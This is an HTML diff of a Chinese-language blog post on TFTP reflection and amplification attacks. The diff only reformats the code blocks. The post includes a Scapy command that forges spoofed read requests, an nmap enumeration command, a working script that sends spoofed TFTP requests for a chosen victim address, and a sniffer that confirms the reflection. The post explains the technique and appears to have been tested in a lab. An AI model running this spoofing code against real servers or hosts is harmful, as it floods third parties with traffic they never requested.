@@ -84,9 +84,11 @@
 
 <p>下面我就在本机上借由<a href="https://github.com/Larryxi/Scapy_zh-cn">Scapy</a>伪造源地址数据包，向服务端(Kali2)发送RRQ数据包请求<code>get</code>服务器上的文件，进而将响应DATA包发射给目标机(XP)，诱发重传机制造成放大攻击。利用Scapy如下：</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">&#39;192.168.1.104&#39;</span><span class="p">,</span><span class="n">src</span><span class="o">=</span><span class="s">&#39;192.168.1.102&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">UDP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">445</span><span class="p">,</span><span class="n">dport</span><span class="o">=</span><span class="mi">69</span><span class="p">)</span><span class="o">/</span><span class="n">TFTP</span><span class="p">()</span><span class="o">/</span><span class="n">TFTP_RRQ</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="s">&#39;larry&#39;</span><span class="p">)</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span>
-<span class="o">&lt;</span><span class="n">IP</span>  <span class="n">frag</span><span class="o">=</span><span class="mi">0</span> <span class="n">proto</span><span class="o">=</span><span class="n">udp</span> <span class="n">src</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.102</span> <span class="n">dst</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.104</span> <span class="o">|&lt;</span><span class="n">UDP</span>  <span class="n">sport</span><span class="o">=</span><span class="n">microsoft_ds</span> <span class="n">dport</span><span class="o">=</span><span class="n">tftp</span> <span class="o">|&lt;</span><span class="n">TFTP</span>  <span class="n">op</span><span class="o">=</span><span class="n">RRQ</span> <span class="o">|&lt;</span><span class="n">TFTP_RRQ</span>  <span class="n">filename</span><span class="o">=</span><span class="s">&#39;larry&#39;</span> <span class="o">|&gt;&gt;&gt;&gt;</span></code></pre></div>
+<div>
+  <pre><code class="python">&gt;&gt;&gt; a = IP(dst='192.168.1.104',src='192.168.1.102')/UDP(sport=445,dport=69)/TFTP()/TFTP_RRQ(filename='larry')
+&gt;&gt;&gt; a
+&lt;IP  frag=0 proto=udp src=192.168.1.102 dst=192.168.1.104 |&lt;UDP  sport=microsoft_ds dport=tftp |&lt;TFTP  op=RRQ |&lt;TFTP_RRQ  filename='larry' |&gt;&gt;&gt;&gt;</code></pre>
+</div>
 
 <p>也还是有两点需要说明，我们这里伪造的源端口用的是XP SP3默认开启的UDP端口之一(123,137,138,445,500,1900)，当然你也可以用其他你在攻击目标上扫描出来的端口；另一点就是为了达到放大数据包大小的最佳效果，我们这里<code>RRQ</code>的已知文件的大小必须大于512字节为好。三个主机在同一个网段下的测试结果图如下：</p>
 
@@ -114,7 +116,9 @@
 
 <p>虽然服务器端无认证过程可以随意登录，但是无法列目录，而造成反射的基础就是需要服务端能够发送出DATA数据包。这就需要我们一个个<code>get</code>测试看看TFTP服务器上存在哪些常见的文件了，我们可以对思科（广泛使用TFTP服务）设备文件和其他你认为有可能存在的文件进行测试。还好<a href="http://seclists.org/nmap-dev/2011/q2/730">nmap</a>在这里给我们提供了一个<a href="https://nmap.org/nsedoc/scripts/tftp-enum.html">tftp-enum.nse</a>脚本，可以如下使用：</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>sudo nmap -sU -p <span class="m">69</span> --script tftp-enum.nse --script-args<span class="o">=</span><span class="s2">&quot;tftp-enum.filelist=customlist.txt&quot;</span> &lt;host&gt;</code></pre></div>
+<div>
+  <pre><code class="bash">$ sudo nmap -sU -p 69 --script tftp-enum.nse --script-args=&quot;tftp-enum.filelist=customlist.txt&quot; &lt;host&gt;</code></pre>
+</div>
 
 <p>如果未加<code>--script-args</code>的话，脚本会默认调用<a href="https://github.com/nmap/nmap/blob/master/nselib/data/tftplist.txt">tftplist.txt</a>文件去枚举可能存在的文件。当然，<code>tftp-enum.filelist</code>可以指定自定义的列表进行枚举扫描。测试结果示例如下：</p>
 
@@ -132,85 +136,89 @@
 
 <p>除了以上两点，如果存在其他的过滤机制，我们最终就需要测试一下该TFTP服务是否可利用，在攻击端伪造简单的数据包触发其反射到指定的主机上，代码如下：</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
-<span class="c">#coding=utf-8    </span>
+<div>
+  <pre><code class="python">#!/usr/bin/env python
+#coding=utf-8    
 
-<span class="kn">import</span> <span class="nn">optparse</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">logging</span>    
+import optparse
+import sys
+import logging    
 
-<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>    
+from scapy.all import *    
 
-<span class="k">class</span> <span class="nc">Trigger</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
-    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">server</span><span class="p">):</span>
-        <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s">&#39;scapy.runtime&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">)</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">target</span> <span class="o">=</span> <span class="n">target</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">server</span> <span class="o">=</span> <span class="n">server</span>    
+class Trigger(object):
+    def __init__(self, target, port, filename, server):
+        logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
+        self.target = target
+        self.port = port
+        self.filename = filename
+        self.server = server    
 
-    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="n">t</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">server</span><span class="p">)</span><span class="o">/</span><span class="n">UDP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">69</span><span class="p">)</span><span class="o">/</span><span class="n">TFTP</span><span class="p">()</span><span class="o">/</span><span class="n">TFTP_RRQ</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
-        <span class="n">send</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
-        <span class="k">print</span> <span class="s">&#39;[+] The trigger has benn sent !&#39;</span>    
+    def run(self):
+        t = IP(src=self.target, dst=self.server)/UDP(sport=self.port, dport=69)/TFTP()/TFTP_RRQ(filename=self.filename)
+        send(t)
+        print '[+] The trigger has benn sent !'    
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="n">parser</span> <span class="o">=</span> <span class="n">optparse</span><span class="o">.</span><span class="n">OptionParser</span><span class="p">(</span><span class="s">&#39;uasge: %prog [options]&#39;</span><span class="p">)</span>
-    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s">&#39;-t&#39;</span><span class="p">,</span> <span class="s">&#39;--target&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="s">&#39;The ip of target&#39;</span><span class="p">)</span>
-    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s">&#39;-f&#39;</span><span class="p">,</span> <span class="s">&#39;--filename&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">&#39;larry&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;The filename for RRQ&#39;</span><span class="p">)</span>
-    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s">&#39;-p&#39;</span><span class="p">,</span> <span class="s">&#39;--port&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">2333</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;The src port of target&#39;</span><span class="p">)</span>    
+if __name__ == '__main__':
+    parser = optparse.OptionParser('uasge: %prog [options]')
+    parser.add_option('-t', '--target', default=None,help='The ip of target')
+    parser.add_option('-f', '--filename', default='larry', help='The filename for RRQ')
+    parser.add_option('-p', '--port', type=int, default=2333, help='The src port of target')    
 
-    <span class="p">(</span><span class="n">options</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">target</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
-        <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>    
+    (options, args) = parser.parse_args()
+    if len(args) &lt; 1 or options.target == None:
+        parser.print_help()
+        sys.exit(0)    
 
-    <span class="n">trigger</span> <span class="o">=</span> <span class="n">Trigger</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">options</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">options</span><span class="o">.</span><span class="n">port</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="n">options</span><span class="o">.</span><span class="n">filename</span><span class="p">,</span> <span class="n">server</span><span class="o">=</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>    
+    trigger = Trigger(target=options.target, port=options.port, filename=options.filename, server=args[0])    
 
-    <span class="n">trigger</span><span class="o">.</span><span class="n">run</span><span class="p">()</span></code></pre></div>
+    trigger.run()</code></pre>
+</div>
 
 <p>在我们之前指定的主机上检测一下是否有如期的DATA数据包到来即可，代码如下：</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
-<span class="c">#coding=utf-8    </span>
+<div>
+  <pre><code class="python">#!/usr/bin/env python
+#coding=utf-8    
 
-<span class="kn">import</span> <span class="nn">optparse</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">logging</span>    
+import optparse
+import sys
+import logging    
 
-<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>    
+from scapy.all import *    
 
-<span class="k">class</span> <span class="nc">Sniff</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
-    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
-        <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s">&#39;scapy.runtime&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">)</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>    
+class Sniff(object):
+    def __init__(self, port):
+        logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
+        self.port = port    
 
-    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="n">sniff</span><span class="p">(</span><span class="n">prn</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">udp_monitor_callback</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="s">&#39;udp&#39;</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
-        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-            <span class="k">print</span> <span class="s">&#39;[+] Bye !&#39;</span>
-            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>    
+    def run(self):
+        try:
+            sniff(prn=self.udp_monitor_callback, filter='udp', store=0)
+        except KeyboardInterrupt as e:
+            print '[+] Bye !'
+            sys.exit(0)    
 
-    <span class="k">def</span> <span class="nf">udp_monitor_callback</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">pkt</span><span class="p">):</span>
-        <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">getlayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">):</span>
-            <span class="n">raw_load</span> <span class="o">=</span> <span class="n">pkt</span><span class="o">.</span><span class="n">getlayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">)</span><span class="o">.</span><span class="n">load</span>
-            <span class="k">if</span> <span class="n">pkt</span><span class="p">[</span><span class="n">UDP</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="ow">and</span> <span class="n">raw_load</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;</span><span class="se">\x00\x03\x00\x01</span><span class="s">&#39;</span><span class="p">:</span>
-                <span class="k">print</span> <span class="s">&#39;[+] The server </span><span class="si">%s</span><span class="s"> is available&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">)</span>
-                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>    
+    def udp_monitor_callback(self, pkt):
+        if pkt.getlayer(Raw):
+            raw_load = pkt.getlayer(Raw).load
+            if pkt[UDP].dport == self.port and raw_load[:4] == '\x00\x03\x00\x01':
+                print '[+] The server %s is available' % (pkt[IP].src)
+                sys.exit(0)    
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="n">parser</span> <span class="o">=</span> <span class="n">optparse</span><span class="o">.</span><span class="n">OptionParser</span><span class="p">(</span><span class="s">&#39;usage: %prog [options]&#39;</span><span class="p">)</span>
-    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s">&#39;-p&#39;</span><span class="p">,</span> <span class="s">&#39;--port&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">2333</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;The port from server&#39;</span><span class="p">)</span>    
+if __name__ == '__main__':
+    parser = optparse.OptionParser('usage: %prog [options]')
+    parser.add_option('-p', '--port', type=int, default=2333, help='The port from server')    
 
-    <span class="p">(</span><span class="n">options</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
-        <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>    
+    (options, args) = parser.parse_args()
+    if len(args) &gt; 0:
+        parser.print_help()
+        sys.exit(0)    
 
-    <span class="n">s</span> <span class="o">=</span> <span class="n">Sniff</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="n">options</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>    
+    s = Sniff(port=options.port)    
 
-    <span class="n">s</span><span class="o">.</span><span class="n">run</span><span class="p">()</span></code></pre></div>
+    s.run()</code></pre>
+</div>
 
 <p>这样一放一收就可以知道该TFTP服务器是否可以利用了。</p>
 
